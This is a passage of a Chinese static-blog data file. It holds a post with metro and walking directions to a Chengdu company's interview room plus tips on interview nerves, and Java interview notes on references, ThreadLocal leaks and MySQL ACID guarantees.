title=\"怎样才能不紧张\"></a>怎样才能不紧张</h3><p>如果你没有过面试经历，那么第一次面试肯定会有一定的压力，会紧张，这样会影响自己的发挥水平，你可以通过以下方式缓解压力：</p>\n<ul>\n<li><p>吃好早饭/午饭<br>保证自己精神饱满</p>\n</li>\n<li><p>给自己打气<br>心理暗示比想象的要重要很多。不断对自己说我能行！我可以！之类鼓舞自己的句子，可以无形中化解紧张</p>\n</li>\n<li><p>家人、朋友的鼓励<br>家人、朋友的支持、鼓励和肯定是治愈焦虑最好的良药，他们可以帮你找到自己的闪光点，让你找到自信。所以找朋友疏解紧张情绪也是个不错的办法</p>\n</li>\n<li><p>微笑<br>微笑可以让人心态变得更积极</p>\n</li>\n</ul>\n<p>如果你已经有了丰富的面试经历，那么你只需要为面试做好充分准备即可</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"欢迎您来到四川物连数智科技面试\"><a href=\"#欢迎您来到四川物连数智科技面试\" class=\"headerlink\" title=\"欢迎您来到四川物连数智科技面试\"></a>欢迎您来到<a href=\"https://www.tianyancha.com/company/4356543553\">四川物连数智科技</a>面试</h1><p>四川物连数智科技有限公司，成立于2021年，位于四川省成都市，是一家以从事研究和试验发展为主的企业。</p>\n<h2 id=\"收到面试邀请要怎么去？\"><a href=\"#收到面试邀请要怎么去？\" class=\"headerlink\" title=\"收到面试邀请要怎么去？\"></a>收到面试邀请要怎么去？</h2><blockquote>\n<p>以从<a href=\"https://baike.baidu.com/item/%E5%A4%A9%E5%BA%9C%E5%B9%BF%E5%9C%BA/1533806\">天府广场</a>为例</p>\n</blockquote>\n<h3 id=\"天府广场地铁搭乘\"><a href=\"#天府广场地铁搭乘\" class=\"headerlink\" title=\"天府广场地铁搭乘\"></a>天府广场地铁搭乘</h3><blockquote>\n<p>进入天府广场地铁站之后根据指示牌到一号线位置</p>\n</blockquote>\n<blockquote>\n<p>乘坐开往科学城方向的地铁</p>\n</blockquote>\n<blockquote>\n<p>到达省体育馆之后下车<br><img src=\"https://s2.loli.net/2023/02/01/375rlxqCGgo42MU.jpg\" alt=\"shengtiyuguan.jpg\"></p>\n</blockquote>\n<h3 id=\"省体育馆地铁换乘\"><a href=\"#省体育馆地铁换乘\" class=\"headerlink\" title=\"省体育馆地铁换乘\"></a>省体育馆地铁换乘</h3><blockquote>\n<p>在省体育馆站内根据指示牌到三号线位置换乘</p>\n</blockquote>\n<blockquote>\n<p>乘坐开往双流西站方向的地铁</p>\n</blockquote>\n<blockquote>\n<p>到达太平园站之后下车</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/c1ubwKPYZViRDq3.jpg\" alt=\"taipingyuan.jpg\"></p>\n<h3 id=\"太平园地铁换乘\"><a href=\"#太平园地铁换乘\" class=\"headerlink\" title=\"太平园地铁换乘\"></a>太平园地铁换乘</h3><blockquote>\n<p>在太平园站内根据指示牌到十号线位置换乘</p>\n</blockquote>\n<blockquote>\n<p>乘坐开往新平方向的地铁</p>\n</blockquote>\n<blockquote>\n<p>到达新津站之后下车出站</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/NKuAGSRs1mhvxTz.jpg\" alt=\"tianfuguangchang.jpg\"></p>\n<h3 id=\"从新津站到公司\"><a href=\"#从新津站到公司\" class=\"headerlink\" title=\"从新津站到公司\"></a>从新津站到公司</h3><blockquote>\n<p>从新津站A口出站来按照如下导航步行到公司</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/XvepRP5T7AJIH6C.jpg\" alt=\"daohang.jpg\"></p>\n<h4 id=\"具体导航\"><a href=\"#具体导航\" class=\"headerlink\" title=\"具体导航\"></a>具体导航</h4><blockquote>\n<p>出站来到这里向左</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/yBovVJUrdcH4hgb.jpg\" alt=\"1.jpg\"></p>\n<blockquote>\n<p>步行到斑马线</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/PJTZbq6R2mQFW5h.jpg\" alt=\"2.jpg\"><br><img src=\"https://s2.loli.net/2023/02/01/MehpJW1dtE3woB4.jpg\" alt=\"3.jpg\"></p>\n<blockquote>\n<p>过斑马线之后向左个斑马线位置</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/LoMbKxkImVs3edS.jpg\" alt=\"4.jpg\"><br><img src=\"https://s2.loli.net/2023/02/01/6QABp3Vg9fmsWnj.jpg\" alt=\"5.jpg\"></p>\n<blockquote>\n<p>到达这里之后背后有这样的标识</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/NZHQMgLsemyBojr.jpg\" alt=\"7.jpg\"></p>\n<blockquote>\n<p>过去之后直走不要向右</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/5yrwpeoHSJulnqc.jpg\" alt=\"1.jpg\"></p>\n<blockquote>\n<p>走到看到<code>数字经济产业互联网基地</code>停止</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/C4xMlvaJHWIyBnz.jpg\" alt=\"2.jpg\"></p>\n<blockquote>\n<p>从LoftB进入乘坐电梯到二楼(电梯两边都有按钮)</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/exT6g3BS87u9zJK.jpg\" alt=\"3.jpg\"><br><img src=\"https://s2.loli.net/2023/02/01/kR4ajXsfeQ1SyD8.jpg\" alt=\"4.jpg\"></p>\n<blockquote>\n<p>到二楼之后往左走到205你就到了面试地点了</p>\n</blockquote>\n<p><img src=\"https://s2.loli.net/2023/02/01/FwmcjivWnrPpyg4.jpg\" alt=\"6.jpg\"><br><img src=\"https://s2.loli.net/2023/02/01/794fjOskN2FMQVc.jpg\" alt=\"7.jpg\"></p>\n<h2 id=\"如何看待面试\"><a href=\"#如何看待面试\" class=\"headerlink\" title=\"如何看待面试\"></a>如何看待面试</h2><h3 id=\"怎样才能不紧张\"><a href=\"#怎样才能不紧张\" class=\"headerlink\" title=\"怎样才能不紧张\"></a>怎样才能不紧张</h3><p>如果你没有过面试经历，那么第一次面试肯定会有一定的压力，会紧张，这样会影响自己的发挥水平，你可以通过以下方式缓解压力：</p>\n<ul>\n<li><p>吃好早饭/午饭<br>保证自己精神饱满</p>\n</li>\n<li><p>给自己打气<br>心理暗示比想象的要重要很多。不断对自己说我能行！我可以！之类鼓舞自己的句子，可以无形中化解紧张</p>\n</li>\n<li><p>家人、朋友的鼓励<br>家人、朋友的支持、鼓励和肯定是治愈焦虑最好的良药，他们可以帮你找到自己的闪光点，让你找到自信。所以找朋友疏解紧张情绪也是个不错的办法</p>\n</li>\n<li><p>微笑<br>微笑可以让人心态变得更积极</p>\n</li>\n</ul>\n<p>如果你已经有了丰富的面试经历，那么你只需要为面试做好充分准备即可</p>\n"},{"title":"八股文","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-02-14T02:16:00.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"java面试八股文","_content":"\n# 面向对象的特征\n## 封装\n\n封装隐藏了类的内部实现机制，就和方法封装了一些内部实现一样，可以在不影响使用的情况下改变类的内部的结构同时保护了数据。增加了代码的可维护性以及便于修改。封装好的代码可以复用，增加了代码的复用性。\n\n## 继承\n\n子类可以使用父类的方法，猫狗都是动物，可以继承相同的属性，同时写自己不同的方法，是一种复用的概念。也是增加了代码的复用性。\n\n## 多态\n\n第一要有继承，第二要有重写，第三父类引用指向子类对象。增加了代码的可移植性，健壮性，灵活性。\n\n# 强软弱虚Java中的引用类型\n## Java中的引用类型有哪几种\n\n### 强引用\n我们平时new的对象都是强引用，只要有引用指向这个对象，这个对象就不会被回收（gc的时候），如何让引用没有指向？那就是引用对象=null，在gc的时候就会被回收。有指向的时候不会被回收。\n\n### 软引用\n被SoftReference包装的对象，表示有一个引用对象指向SoftRefrence是强引用，而SoftRefrence指向被包装的对象为软引用。调用get方法可以拿到这个软引用对象。在内存空间充足的情况下不会被gc回收，在空间不足的时候软引用会自动gc回收。空间狗的时候，随便分配，当强引用要分配空间，且空间不足的时候，就会将软引用挤掉。一般在缓存中会经常使用软引用。\n\n### 弱引用\n被WeakRefrence包装的对象，表示有一个引用对象指向WeakRefrence是强引用，而WeakRefrence指向被包装的对象为弱引用，调用get方法可以拿到这个弱引用对象，不管内存空间够不够，都会被gc回收。和ThreadLocal的关系比较大。\n\n### 虚引用（不重要）\n被PhantomReference包装的对象，不能获取到这个对象，get方法返回的是null，不是给业务人员用的，虚引用指向的对象是给gc回收对象用的，堆外内存使用（不归jvm管的内存），如果一个对象管理了一个堆外内存，当这个对象被干掉的时候，这个堆外的内存应该也被干掉，虚引用就是解决这个问题的，关联一个引用队列。\n虚引用，顾名思义，就是形同虚设，与其他几种引用都不太一样，一个对象是否有虚引用的存在，完全不会对其生存时间构成影响，也无法通过虚引用来取得一个对象实例，而且它的 get() 方法仅仅是返回一个null，也就是说将永远无法通过虚引用来获取对象，虚引用必须要和 ReferenceQueue 引用队列一起使用\n\n### 引用队列（ReferenceQueue）（不重要）\n引用队列可以与软引用、弱引用以及虚引用一起配合使用，当垃圾回收器准备回收一个对象时，如果发现它还有引用，那么就会在回收对象之前，把这个引用加入到与之关联的引用队列中去。ReferenceQueue内部数据结构是一个链表，链表里的元素是加入进去的Reference实例，然后通过wait和notifyAll与对象锁实现生产者和消费者，通过这种方式模拟一个队列。ReferenceQueue是使用wati()和notifyAll()实现生产者和消费者模式的一个具体场景。\n\n## ThreadLocal你了解吗\n使用弱引用做的，第一感觉，ThreadLocal是个容器，可以给里面装对象，可以指定里面装什么类型的对象，装的也是引用，指定的是对象。特点是在同一个线程中才能读到数据。\n给ThreadLocal中填充对象的时候，会拿到当前线程，然后获取当前线程的map，然后将值保存到当前map中，每个线程的map都是独立的，所以ThreadLocal只能在同一个线程中共享数据。\n给Theadlocal中填充值的时候，最终是填充到当前线程的map中，而我们set的时候只是传递了value，key没有我们自己传递，这个key就是ThreadLocal对象\n总体流程就是填充值的时候，拿到当前线程，再拿到当前线程的map，往这个map填充东西的时候，key是ThreadLocal对象，value是我们要保存的数据，在填充map的时候，使用了一个Entry出来，这个Entry继承了WeakRefrence对象，在这里调用了WeakRefrence的构造方法，把key的引用设置成了弱引用，意思就是说创建ThreadLoacl的时候有一个强引用指向她，在set值的时候，map的key还有一个弱引用指向它。\n\n## ThreadLocal应用在什么地方\nSpring框架的@Trasactional注解，数据库连接对象都放在ThreadLocal中，在方法中调用其他方法的时候都用的同一个连接对象，这样才能处理事务。\n\n## ThreadLocal会产生内存泄露你了解吗\n创建ThreadLoacl的时候有一个强引用指向她，在set值的时候，map的key还有一个弱引用指向它，这样在ThreadLocal不用的时候，可以将引用设置为null，gc可以直接回收，如果把key指向ThreadLocal这个引用设置为强引用，那么如果map有值的话，ThreadLocal就不会被回收，就会造成内存泄露。在使用了ThreadLocal的值之后，如果不将map的值移除，那么value的值也是强引用也会导致内存泄露问题，所以当ThreadLocal对象使用完成之后一定要用remove方法清除map的值。弱引用解决key，remove解决value。value不能使用弱引用，主要是因为没有一个强引用指向value，只有一个弱引用的话，会直接gc掉。\n\n# ACID是靠什么保证的\n原子性：由undolog日志来保证，他记录了需要回滚的日志信息，事务回滚时撤销已经执行成功的sql\n\n一致性：由原子性，隔离性，持久性共同保证。\n\n隔离性：是由MVCC来保证，事务之间相互隔离，多版本并发控制。\n\n持久性：是由redolog来保证的，mysql修改数据的时候会在redolog中记录一份日志数据，就栓数据没有保存成功，只要日志保存成功了，数据仍然不会丢失。\n\n# BeanFactory和ApplicationContext区别\n\n\n","source":"_posts/八股文.md","raw":"---\ntitle: 八股文\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-02-14 10:16:00\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: java面试八股文\ntags: 面试\ncategories: 面试题\n---\n\n# 面向对象的特征\n## 封装\n\n封装隐藏了类的内部实现机制，就和方法封装了一些内部实现一样，可以在不影响使用的情况下改变类的内部的结构同时保护了数据。增加了代码的可维护性以及便于修改。封装好的代码可以复用，增加了代码的复用性。\n\n## 继承\n\n子类可以使用父类的方法，猫狗都是动物，可以继承相同的属性，同时写自己不同的方法，是一种复用的概念。也是增加了代码的复用性。\n\n## 多态\n\n第一要有继承，第二要有重写，第三父类引用指向子类对象。增加了代码的可移植性，健壮性，灵活性。\n\n# 强软弱虚Java中的引用类型\n## Java中的引用类型有哪几种\n\n### 强引用\n我们平时new的对象都是强引用，只要有引用指向这个对象，这个对象就不会被回收（gc的时候），如何让引用没有指向？那就是引用对象=null，在gc的时候就会被回收。有指向的时候不会被回收。\n\n### 软引用\n被SoftReference包装的对象，表示有一个引用对象指向SoftRefrence是强引用，而SoftRefrence指向被包装的对象为软引用。调用get方法可以拿到这个软引用对象。在内存空间充足的情况下不会被gc回收，在空间不足的时候软引用会自动gc回收。空间狗的时候，随便分配，当强引用要分配空间，且空间不足的时候，就会将软引用挤掉。一般在缓存中会经常使用软引用。\n\n### 弱引用\n被WeakRefrence包装的对象，表示有一个引用对象指向WeakRefrence是强引用，而WeakRefrence指向被包装的对象为弱引用，调用get方法可以拿到这个弱引用对象，不管内存空间够不够，都会被gc回收。和ThreadLocal的关系比较大。\n\n### 虚引用（不重要）\n被PhantomReference包装的对象，不能获取到这个对象，get方法返回的是null，不是给业务人员用的，虚引用指向的对象是给gc回收对象用的，堆外内存使用（不归jvm管的内存），如果一个对象管理了一个堆外内存，当这个对象被干掉的时候，这个堆外的内存应该也被干掉，虚引用就是解决这个问题的，关联一个引用队列。\n虚引用，顾名思义，就是形同虚设，与其他几种引用都不太一样，一个对象是否有虚引用的存在，完全不会对其生存时间构成影响，也无法通过虚引用来取得一个对象实例，而且它的 get() 方法仅仅是返回一个null，也就是说将永远无法通过虚引用来获取对象，虚引用必须要和 ReferenceQueue 引用队列一起使用\n\n### 引用队列（ReferenceQueue）（不重要）\n引用队列可以与软引用、弱引用以及虚引用一起配合使用，当垃圾回收器准备回收一个对象时，如果发现它还有引用，那么就会在回收对象之前，把这个引用加入到与之关联的引用队列中去。ReferenceQueue内部数据结构是一个链表，链表里的元素是加入进去的Reference实例，然后通过wait和notifyAll与对象锁实现生产者和消费者，通过这种方式模拟一个队列。ReferenceQueue是使用wati()和notifyAll()实现生产者和消费者模式的一个具体场景。\n\n## ThreadLocal你了解吗\n使用弱引用做的，第一感觉，ThreadLocal是个容器，可以给里面装对象，可以指定里面装什么类型的对象，装的也是引用，指定的是对象。特点是在同一个线程中才能读到数据。\n给ThreadLocal中填充对象的时候，会拿到当前线程，然后获取当前线程的map，然后将值保存到当前map中，每个线程的map都是独立的，所以ThreadLocal只能在同一个线程中共享数据。\n给Theadlocal中填充值的时候，最终是填充到当前线程的map中，而我们set的时候只是传递了value，key没有我们自己传递，这个key就是ThreadLocal对象\n总体流程就是填充值的时候，拿到当前线程，再拿到当前线程的map，往这个map填充东西的时候，key是ThreadLocal对象，value是我们要保存的数据，在填充map的时候，使用了一个Entry出来，这个Entry继承了WeakRefrence对象，在这里调用了WeakRefrence的构造方法，把key的引用设置成了弱引用，意思就是说创建ThreadLoacl的时候有一个强引用指向她，在set值的时候，map的key还有一个弱引用指向它。\n\n## ThreadLocal应用在什么地方\nSpring框架的@Trasactional注解，数据库连接对象都放在ThreadLocal中，在方法中调用其他方法的时候都用的同一个连接对象，这样才能处理事务。\n\n## ThreadLocal会产生内存泄露你了解吗\n创建ThreadLoacl的时候有一个强引用指向她，在set值的时候，map的key还有一个弱引用指向它，这样在ThreadLocal不用的时候，可以将引用设置为null，gc可以直接回收，如果把key指向ThreadLocal这个引用设置为强引用，那么如果map有值的话，ThreadLocal就不会被回收，就会造成内存泄露。在使用了ThreadLocal的值之后，如果不将map的值移除，那么value的值也是强引用也会导致内存泄露问题，所以当ThreadLocal对象使用完成之后一定要用remove方法清除map的值。弱引用解决key，remove解决value。value不能使用弱引用，主要是因为没有一个强引用指向value，只有一个弱引用的话，会直接gc掉。\n\n# ACID是靠什么保证的\n原子性：由undolog日志来保证，他记录了需要回滚的日志信息，事务回滚时撤销已经执行成功的sql\n\n一致性：由原子性，隔离性，持久性共同保证。\n\n隔离性：是由MVCC来保证，事务之间相互隔离，多版本并发控制。\n\n持久性：是由redolog来保证的，mysql修改数据的时候会在redolog中记录一份日志数据，就栓数据没有保存成功，只要日志保存成功了，数据仍然不会丢失。\n\n# BeanFactory和ApplicationContext区别\n\n\n","slug":"八股文","published":1,"updated":"2023-03-10T02:52:00.603Z","_id":"cledy5z560000g0vg1v9u7ovs","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"面向对象的特征\"><a href=\"#面向对象的特征\" class=\"headerlink\" title=\"面向对象的特征\"></a>面向对象的特征</h1><h2 id=\"封装\"><a href=\"#封装\" class=\"headerlink\" title=\"封装\"></a>封装</h2><p>封装隐藏了类的内部实现机制，就和方法封装了一些内部实现一样，可以在不影响使用的情况下改变类的内部的结构同时保护了数据。增加了代码的可维护性以及便于修改。封装好的代码可以复用，增加了代码的复用性。</p>\n<h2 id=\"继承\"><a href=\"#继承\" class=\"headerlink\" title=\"继承\"></a>继承</h2><p>子类可以使用父类的方法，猫狗都是动物，可以继承相同的属性，同时写自己不同的方法，是一种复用的概念。也是增加了代码的复用性。</p>\n<h2 id=\"多态\"><a href=\"#多态\" class=\"headerlink\" title=\"多态\"></a>多态</h2><p>第一要有继承，第二要有重写，第三父类引用指向子类对象。增加了代码的可移植性，健壮性，灵活性。</p>\n<h1 id=\"强软弱虚Java中的引用类型\"><a href=\"#强软弱虚Java中的引用类型\" class=\"headerlink\" title=\"强软弱虚Java中的引用类型\"></a>强软弱虚Java中的引用类型</h1><h2 id=\"Java中的引用类型有哪几种\"><a href=\"#Java中的引用类型有哪几种\" class=\"headerlink\" title=\"Java中的引用类型有哪几种\"></a>Java中的引用类型有哪几种</h2><h3 id=\"强引用\"><a href=\"#强引用\" class=\"headerlink\" title=\"强引用\"></a>强引用</h3><p>我们平时new的对象都是强引用，只要有引用指向这个对象，这个对象就不会被回收（gc的时候），如何让引用没有指向？那就是引用对象=null，在gc的时候就会被回收。有指向的时候不会被回收。</p>\n<h3 id=\"软引用\"><a href=\"#软引用\" class=\"headerlink\" title=\"软引用\"></a>软引用</h3><p>被SoftReference包装的对象，表示有一个引用对象指向SoftRefrence是强引用，而SoftRefrence指向被包装的对象为软引用。调用get方法可以拿到这个软引用对象。在内存空间充足的情况下不会被gc回收，在空间不足的时候软引用会自动gc回收。空间狗的时候，随便分配，当强引用要分配空间，且空间不足的时候，就会将软引用挤掉。一般在缓存中会经常使用软引用。</p>\n<h3 id=\"弱引用\"><a href=\"#弱引用\" class=\"headerlink\" title=\"弱引用\"></a>弱引用</h3><p>被WeakRefrence包装的对象，表示有一个引用对象指向WeakRefrence是强引用，而WeakRefrence指向被包装的对象为弱引用，调用get方法可以拿到这个弱引用对象，不管内存空间够不够，都会被gc回收。和ThreadLocal的关系比较大。</p>\n<h3 id=\"虚引用（不重要）\"><a href=\"#虚引用（不重要）\" class=\"headerlink\" title=\"虚引用（不重要）\"></a>虚引用（不重要）</h3><p>被PhantomReference包装的对象，不能获取到这个对象，get方法返回的是null，不是给业务人员用的，虚引用指向的对象是给gc回收对象用的，堆外内存使用（不归jvm管的内存），如果一个对象管理了一个堆外内存，当这个对象被干掉的时候，这个堆外的内存应该也被干掉，虚引用就是解决这个问题的，关联一个引用队列。<br>虚引用，顾名思义，就是形同虚设，与其他几种引用都不太一样，一个对象是否有虚引用的存在，完全不会对其生存时间构成影响，也无法通过虚引用来取得一个对象实例，而且它的 get() 方法仅仅是返回一个null，也就是说将永远无法通过虚引用来获取对象，虚引用必须要和 ReferenceQueue 引用队列一起使用</p>\n<h3 id=\"引用队列（ReferenceQueue）（不重要）\"><a href=\"#引用队列（ReferenceQueue）（不重要）\" class=\"headerlink\" title=\"引用队列（ReferenceQueue）（不重要）\"></a>引用队列（ReferenceQueue）（不重要）</h3><p>引用队列可以与软引用、弱引用以及虚引用一起配合使用，当垃圾回收器准备回收一个对象时，如果发现它还有引用，那么就会在回收对象之前，把这个引用加入到与之关联的引用队列中去。ReferenceQueue内部数据结构是一个链表，链表里的元素是加入进去的Reference实例，然后通过wait和notifyAll与对象锁实现生产者和消费者，通过这种方式模拟一个队列。ReferenceQueue是使用wati()和notifyAll()实现生产者和消费者模式的一个具体场景。</p>\n<h2 id=\"ThreadLocal你了解吗\"><a href=\"#ThreadLocal你了解吗\" class=\"headerlink\" title=\"ThreadLocal你了解吗\"></a>ThreadLocal你了解吗</h2><p>使用弱引用做的，第一感觉，ThreadLocal是个容器，可以给里面装对象，可以指定里面装什么类型的对象，装的也是引用，指定的是对象。特点是在同一个线程中才能读到数据。<br>给ThreadLocal中填充对象的时候，会拿到当前线程，然后获取当前线程的map，然后将值保存到当前map中，每个线程的map都是独立的，所以ThreadLocal只能在同一个线程中共享数据。<br>给Theadlocal中填充值的时候，最终是填充到当前线程的map中，而我们set的时候只是传递了value，key没有我们自己传递，这个key就是ThreadLocal对象<br>总体流程就是填充值的时候，拿到当前线程，再拿到当前线程的map，往这个map填充东西的时候，key是ThreadLocal对象，value是我们要保存的数据，在填充map的时候，使用了一个Entry出来，这个Entry继承了WeakRefrence对象，在这里调用了WeakRefrence的构造方法，把key的引用设置成了弱引用，意思就是说创建ThreadLoacl的时候有一个强引用指向她，在set值的时候，map的key还有一个弱引用指向它。</p>\n<h2 id=\"ThreadLocal应用在什么地方\"><a href=\"#ThreadLocal应用在什么地方\" class=\"headerlink\" title=\"ThreadLocal应用在什么地方\"></a>ThreadLocal应用在什么地方</h2><p>Spring框架的@Trasactional注解，数据库连接对象都放在ThreadLocal中，在方法中调用其他方法的时候都用的同一个连接对象，这样才能处理事务。</p>\n<h2 id=\"ThreadLocal会产生内存泄露你了解吗\"><a href=\"#ThreadLocal会产生内存泄露你了解吗\" class=\"headerlink\" title=\"ThreadLocal会产生内存泄露你了解吗\"></a>ThreadLocal会产生内存泄露你了解吗</h2><p>创建ThreadLoacl的时候有一个强引用指向她，在set值的时候，map的key还有一个弱引用指向它，这样在ThreadLocal不用的时候，可以将引用设置为null，gc可以直接回收，如果把key指向ThreadLocal这个引用设置为强引用，那么如果map有值的话，ThreadLocal就不会被回收，就会造成内存泄露。在使用了ThreadLocal的值之后，如果不将map的值移除，那么value的值也是强引用也会导致内存泄露问题，所以当ThreadLocal对象使用完成之后一定要用remove方法清除map的值。弱引用解决key，remove解决value。value不能使用弱引用，主要是因为没有一个强引用指向value，只有一个弱引用的话，会直接gc掉。</p>\n<h1 id=\"ACID是靠什么保证的\"><a href=\"#ACID是靠什么保证的\" class=\"headerlink\" title=\"ACID是靠什么保证的\"></a>ACID是靠什么保证的</h1><p>原子性：由undolog日志来保证，他记录了需要回滚的日志信息，事务回滚时撤销已经执行成功的sql</p>\n<p>一致性：由原子性，隔离性，持久性共同保证。</p>\n<p>隔离性：是由MVCC来保证，事务之间相互隔离，多版本并发控制。</p>\n<p>持久性：是由redolog来保证的，mysql修改数据的时候会在redolog中记录一份日志数据，就栓数据没有保存成功，只要日志保存成功了，数据仍然不会丢失。</p>\n<h1 id=\"BeanFactory和ApplicationContext区别\"><a href=\"#BeanFactory和ApplicationContext区别\" class=\"headerlink\" title=\"BeanFactory和ApplicationContext区别\"></a>BeanFactory和ApplicationContext区别</h1>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"面向对象的特征\"><a href=\"#面向对象的特征\" class=\"headerlink\" title=\"面向对象的特征\"></a>面向对象的特征</h1><h2 id=\"封装\"><a href=\"#封装\" class=\"headerlink\" title=\"封装\"></a>封装</h2><p>封装隐藏了类的内部实现机制，就和方法封装了一些内部实现一样，可以在不影响使用的情况下改变类的内部的结构同时保护了数据。增加了代码的可维护性以及便于修改。封装好的代码可以复用，增加了代码的复用性。</p>\n<h2 id=\"继承\"><a href=\"#继承\" class=\"headerlink\" title=\"继承\"></a>继承</h2><p>子类可以使用父类的方法，猫狗都是动物，可以继承相同的属性，同时写自己不同的方法，是一种复用的概念。也是增加了代码的复用性。</p>\n<h2 id=\"多态\"><a href=\"#多态\" class=\"headerlink\" title=\"多态\"></a>多态</h2><p>第一要有继承，第二要有重写，第三父类引用指向子类对象。增加了代码的可移植性，健壮性，灵活性。</p>\n<h1 id=\"强软弱虚Java中的引用类型\"><a href=\"#强软弱虚Java中的引用类型\" class=\"headerlink\" title=\"强软弱虚Java中的引用类型\"></a>强软弱虚Java中的引用类型</h1><h2 id=\"Java中的引用类型有哪几种\"><a href=\"#Java中的引用类型有哪几种\" class=\"headerlink\" title=\"Java中的引用类型有哪几种\"></a>Java中的引用类型有哪几种</h2><h3 id=\"强引用\"><a href=\"#强引用\" class=\"headerlink\" title=\"强引用\"></a>强引用</h3><p>我们平时new的对象都是强引用，只要有引用指向这个对象，这个对象就不会被回收（gc的时候），如何让引用没有指向？那就是引用对象=null，在gc的时候就会被回收。有指向的时候不会被回收。</p>\n<h3 id=\"软引用\"><a href=\"#软引用\" class=\"headerlink\" title=\"软引用\"></a>软引用</h3><p>被SoftReference包装的对象，表示有一个引用对象指向SoftRefrence是强引用，而SoftRefrence指向被包装的对象为软引用。调用get方法可以拿到这个软引用对象。在内存空间充足的情况下不会被gc回收，在空间不足的时候软引用会自动gc回收。空间狗的时候，随便分配，当强引用要分配空间，且空间不足的时候，就会将软引用挤掉。一般在缓存中会经常使用软引用。</p>\n<h3 id=\"弱引用\"><a href=\"#弱引用\" class=\"headerlink\" title=\"弱引用\"></a>弱引用</h3><p>被WeakRefrence包装的对象，表示有一个引用对象指向WeakRefrence是强引用，而WeakRefrence指向被包装的对象为弱引用，调用get方法可以拿到这个弱引用对象，不管内存空间够不够，都会被gc回收。和ThreadLocal的关系比较大。</p>\n<h3 id=\"虚引用（不重要）\"><a href=\"#虚引用（不重要）\" class=\"headerlink\" title=\"虚引用（不重要）\"></a>虚引用（不重要）</h3><p>被PhantomReference包装的对象，不能获取到这个对象，get方法返回的是null，不是给业务人员用的，虚引用指向的对象是给gc回收对象用的，堆外内存使用（不归jvm管的内存），如果一个对象管理了一个堆外内存，当这个对象被干掉的时候，这个堆外的内存应该也被干掉，虚引用就是解决这个问题的，关联一个引用队列。<br>虚引用，顾名思义，就是形同虚设，与其他几种引用都不太一样，一个对象是否有虚引用的存在，完全不会对其生存时间构成影响，也无法通过虚引用来取得一个对象实例，而且它的 get() 方法仅仅是返回一个null，也就是说将永远无法通过虚引用来获取对象，虚引用必须要和 ReferenceQueue 引用队列一起使用</p>\n<h3 id=\"引用队列（ReferenceQueue）（不重要）\"><a href=\"#引用队列（ReferenceQueue）（不重要）\" class=\"headerlink\" title=\"引用队列（ReferenceQueue）（不重要）\"></a>引用队列（ReferenceQueue）（不重要）</h3><p>引用队列可以与软引用、弱引用以及虚引用一起配合使用，当垃圾回收器准备回收一个对象时，如果发现它还有引用，那么就会在回收对象之前，把这个引用加入到与之关联的引用队列中去。ReferenceQueue内部数据结构是一个链表，链表里的元素是加入进去的Reference实例，然后通过wait和notifyAll与对象锁实现生产者和消费者，通过这种方式模拟一个队列。ReferenceQueue是使用wati()和notifyAll()实现生产者和消费者模式的一个具体场景。</p>\n<h2 id=\"ThreadLocal你了解吗\"><a href=\"#ThreadLocal你了解吗\" class=\"headerlink\" title=\"ThreadLocal你了解吗\"></a>ThreadLocal你了解吗</h2><p>使用弱引用做的，第一感觉，ThreadLocal是个容器，可以给里面装对象，可以指定里面装什么类型的对象，装的也是引用，指定的是对象。特点是在同一个线程中才能读到数据。<br>给ThreadLocal中填充对象的时候，会拿到当前线程，然后获取当前线程的map，然后将值保存到当前map中，每个线程的map都是独立的，所以ThreadLocal只能在同一个线程中共享数据。<br>给Theadlocal中填充值的时候，最终是填充到当前线程的map中，而我们set的时候只是传递了value，key没有我们自己传递，这个key就是ThreadLocal对象<br>总体流程就是填充值的时候，拿到当前线程，再拿到当前线程的map，往这个map填充东西的时候，key是ThreadLocal对象，value是我们要保存的数据，在填充map的时候，使用了一个Entry出来，这个Entry继承了WeakRefrence对象，在这里调用了WeakRefrence的构造方法，把key的引用设置成了弱引用，意思就是说创建ThreadLoacl的时候有一个强引用指向她，在set值的时候，map的key还有一个弱引用指向它。</p>\n<h2 id=\"ThreadLocal应用在什么地方\"><a href=\"#ThreadLocal应用在什么地方\" class=\"headerlink\" title=\"ThreadLocal应用在什么地方\"></a>ThreadLocal应用在什么地方</h2><p>Spring框架的@Trasactional注解，数据库连接对象都放在ThreadLocal中，在方法中调用其他方法的时候都用的同一个连接对象，这样才能处理事务。</p>\n<h2 id=\"ThreadLocal会产生内存泄露你了解吗\"><a href=\"#ThreadLocal会产生内存泄露你了解吗\" class=\"headerlink\" title=\"ThreadLocal会产生内存泄露你了解吗\"></a>ThreadLocal会产生内存泄露你了解吗</h2><p>创建ThreadLoacl的时候有一个强引用指向她，在set值的时候，map的key还有一个弱引用指向它，这样在ThreadLocal不用的时候，可以将引用设置为null，gc可以直接回收，如果把key指向ThreadLocal这个引用设置为强引用，那么如果map有值的话，ThreadLocal就不会被回收，就会造成内存泄露。在使用了ThreadLocal的值之后，如果不将map的值移除，那么value的值也是强引用也会导致内存泄露问题，所以当ThreadLocal对象使用完成之后一定要用remove方法清除map的值。弱引用解决key，remove解决value。value不能使用弱引用，主要是因为没有一个强引用指向value，只有一个弱引用的话，会直接gc掉。</p>\n<h1 id=\"ACID是靠什么保证的\"><a href=\"#ACID是靠什么保证的\" class=\"headerlink\" 